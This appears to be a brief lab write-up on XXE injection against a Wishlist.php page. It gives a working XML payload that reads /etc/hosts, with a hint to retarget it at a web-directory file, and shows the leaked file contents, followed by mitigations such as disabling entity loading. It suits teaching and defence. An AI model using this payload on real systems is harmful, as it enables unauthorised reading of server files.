## XXE ##

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker 
to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

Wishlist.php

payload

<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]> //CHANGE THE payload SYSTEM to "/var/www/html/wishes/wish_1.txt"
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>

The product ID: 127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
is invalid.

    Disable External Entity Loading: The primary fix is to disable external entity loading in your XML parser. In PHP, for example, you can prevent XXE by setting libxml_disable_entity_loader(true) before processing the XML.
    Validate and Sanitise User Input: Always validate and sanitise the XML input received from users. This ensures that only expected data is processed, reducing the risk of malicious content being included in the request. For example, remove suspicious keywords like /etc/host, /etc/passwd, etc, from the request.

